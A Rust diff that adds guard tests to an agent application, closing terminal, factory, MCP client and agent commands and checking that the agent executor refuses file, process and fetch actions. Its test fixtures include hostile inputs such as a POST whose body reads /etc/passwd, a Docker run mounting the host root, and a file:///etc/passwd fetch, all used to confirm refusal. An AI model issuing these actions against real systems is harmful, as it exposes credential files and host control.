@@ -96,6 +96,23 @@ const CLOSED_COMMANDS: &[(&str, Closure)] = &[
     ("builder_deploy_rollback_to", Closure::LegacyBuilder),
     ("builder_deploy_share_info", Closure::LegacyBuilder),
     ("builder_deploy_drift", Closure::LegacyBuilder),
+    // E3: arbitrary program text is not process authority, and a caller's
+    // assertion is not user approval.
+    ("terminal_execute", Closure::ProcessExecution),
+    ("terminal_execute_approved", Closure::ApprovalRequired),
+    ("factory_create_project", Closure::FileSelection),
+    ("factory_build_project", Closure::ProcessExecution),
+    ("factory_test_project", Closure::ProcessExecution),
+    ("factory_run_pipeline", Closure::ProcessExecution),
+    ("cc_execute_action", Closure::ProcessExecution),
+    ("mcp2_client_add", Closure::ProcessExecution),
+    ("mcp2_client_discover", Closure::ProcessExecution),
+    ("mcp2_client_call", Closure::ProcessExecution),
+    ("nx_agent_run", Closure::ProcessExecution),
+    // E4: agent execution rooted at the process working directory.
+    ("nx_chat", Closure::AgentExecution),
+    ("nx_tool", Closure::AgentExecution),
+    ("run_content_pipeline", Closure::AgentExecution),
 ];
 
 const LIB_RS: &str = include_str!("../lib.rs");
@@ -106,6 +123,9 @@ fn module_source(module: &str) -> &'static str {
     match module {
         "" => LIB_RS,
         "commands::flash" => include_str!("../commands/flash.rs"),
+        "commands::crate_bridges" => include_str!("../commands/crate_bridges.rs"),
+        "commands::orchestration" => include_str!("../commands/orchestration.rs"),
+        "nx_bridge::commands" => include_str!("../nx_bridge/commands.rs"),
         other => panic!("closed handler module {other} is not mapped in the guard"),
     }
 }
@@ -254,12 +274,19 @@ fn closed_handlers() -> Vec<ClosedHandler> {
             builder_theme_export, builder_generate_image, builder_generate_all_images,
             builder_generate_trust_pack, builder_get_audit_trail, builder_export_audit_trail,
             builder_deploy_history, builder_deploy_diff, builder_deploy_rollback_to,
-            builder_deploy_share_info, builder_deploy_drift,
+            builder_deploy_share_info, builder_deploy_drift, terminal_execute,
+            terminal_execute_approved, factory_create_project, factory_build_project,
+            factory_test_project, factory_run_pipeline,
         ],
         crate::commands::flash => [
             flash_profile_model, flash_auto_configure, flash_create_session,
             flash_estimate_performance, flash_run_benchmark, flash_enable_speculative,
         ],
+        crate::commands::crate_bridges => [
+            cc_execute_action, mcp2_client_add, mcp2_client_discover, mcp2_client_call,
+        ],
+        crate::nx_bridge::commands => [nx_agent_run, nx_chat, nx_tool],
+        crate::commands::orchestration => [run_content_pipeline],
     )
 }
 
@@ -283,11 +310,114 @@ fn closed_handlers_return_only_their_bounded_reason() {
 
 #[test]
 fn closure_reasons_are_bounded_and_echo_no_input() {
-    for closure in [Closure::FileSelection, Closure::LegacyBuilder] {
+    for closure in [
+        Closure::FileSelection,
+        Closure::LegacyBuilder,
+        Closure::ProcessExecution,
+        Closure::ApprovalRequired,
+        Closure::AgentExecution,
+    ] {
         let reason = closure.reason();
         assert!(reason.contains("Phase Zero"), "{reason}");
         assert!(reason.len() <= 160, "{reason}");
         assert!(!reason.contains('/') && !reason.contains('\\'), "{reason}");
         assert_eq!(closed("surface", closure), format!("surface: {reason}"));
     }
+}
+
+/// `execute_tool` never runs a process: a tool needing approval is refused as
+/// such (a caller cannot approve it), and any other tool for lack of backend
+/// authority. Each refusal leaves the filesystem untouched.
+#[test]
+fn execute_tool_refuses_before_any_process_runs() {
+    let state = crate::AppState::new_in_memory();
+    let base = std::env::temp_dir().join(format!("nexus-c5a-tool-{}", uuid::Uuid::new_v4()));
+    std::fs::create_dir_all(&base).unwrap();
+    let victim = base.join("victim.txt");
+    std::fs::write(&victim, "kept").unwrap();
+    let created = base.join("created");
+    let path = |p: &std::path::Path| p.to_string_lossy().into_owned();
+    let cases = [
+        // Needs approval: destructive, and custom programs.
+        (
+            serde_json::json!({"FileRemove": {"path": path(&victim)}}),
+            Closure::ApprovalRequired,
+        ),
+        (
+            serde_json::json!({"Custom": {"program": "touch", "args": [path(&created)], "requires_approval": false}}),
+            Closure::ApprovalRequired,
+        ),
+        // Would run a process with no backend authority.
+        (
+            serde_json::json!({"MakeDirectory": {"path": path(&created)}}),
+            Closure::ProcessExecution,
+        ),
+        (serde_json::json!("GitStatus"), Closure::ProcessExecution),
+    ];
+    for (tool, closure) in cases {
+        assert_eq!(
+            crate::execute_tool(&state, tool.to_string()),
+            Err(closed("execute_tool", closure)),
+            "{tool}"
+        );
+    }
+    assert_eq!(std::fs::read_to_string(&victim).unwrap(), "kept");
+    assert!(!created.exists());
+    std::fs::remove_dir_all(&base).unwrap();
+}
+
+/// The production agent executor refuses filesystem, process, OS-input and
+/// cwd-rooted actions before they reach an actuator, and has no workspace.
+#[test]
+fn production_agent_executor_refuses_filesystem_and_process_actions() {
+    use nexus_kernel::cognitive::loop_runtime::ActionExecutor;
+    use nexus_kernel::cognitive::PlannedAction;
+
+    let state = crate::AppState::new_in_memory();
+    let memory = std::sync::Arc::new(nexus_kernel::cognitive::AgentMemoryManager::new(Box::new(
+        crate::DbMemoryStore {
+            db: state.db.clone(),
+        },
+    )));
+    let executor = crate::phase0_agent_executor(&state, memory);
+    let mut audit = state.audit.clone();
+    let agent = uuid::Uuid::new_v4().to_string();
+    let base = std::env::temp_dir().join(format!("nexus-c5a-agent-{}", uuid::Uuid::new_v4()));
+    std::fs::create_dir_all(&base).unwrap();
+    let target = base.join("written.txt");
+    let target = target.to_string_lossy().into_owned();
+    let refused = [
+        serde_json::json!({"type": "FileRead", "path": target}),
+        serde_json::json!({"type": "FileWrite", "path": target, "content": "x"}),
+        serde_json::json!({"type": "ShellCommand", "command": "touch", "args": [target]}),
+        serde_json::json!({"type": "DockerCommand", "subcommand": "run", "args": ["-v", "/:/host", "img"]}),
+        serde_json::json!({"type": "CodeExecute", "language": "python", "code": "open('x','w')"}),
+        serde_json::json!({"type": "ApiCall", "method": "POST", "url": "https://example.com", "body": "@/etc/passwd"}),
+        serde_json::json!({"type": "ImageGenerate", "prompt": "p", "output_path": target}),
+        serde_json::json!({"type": "TextToSpeech", "text": "t", "output_path": target}),
+        serde_json::json!({"type": "BrowserAutomate", "start_url": "https://example.com", "actions": []}),
+        serde_json::json!({"type": "CaptureScreen"}),
+        serde_json::json!({"type": "KeyboardType", "text": "t"}),
+        // A fetch is web-only: a file URL is a local path under another name.
+        serde_json::json!({"type": "WebFetch", "url": format!("file://{target}")}),
+        serde_json::json!({"type": "WebFetch", "url": " FILE:///etc/passwd"}),
+    ];
+    for action in refused {
+        let parsed: PlannedAction = match serde_json::from_value(action.clone()) {
+            Ok(parsed) => parsed,
+            Err(error) => panic!("fixture {action} must parse: {error}"),
+        };
+        assert_eq!(
+            executor.execute(&agent, &parsed, &mut audit, true),
+            Err(closed(parsed.action_type(), Closure::AgentExecution)),
+            "{action}"
+        );
+    }
+    assert!(!std::path::Path::new(&target).exists());
+    std::fs::remove_dir_all(&base).unwrap();
+    // Actions holding no filesystem or process authority still run.
+    assert_eq!(
+        executor.execute(&agent, &PlannedAction::Noop, &mut audit, false),
+        Ok("ok".to_string())
+    );
 }
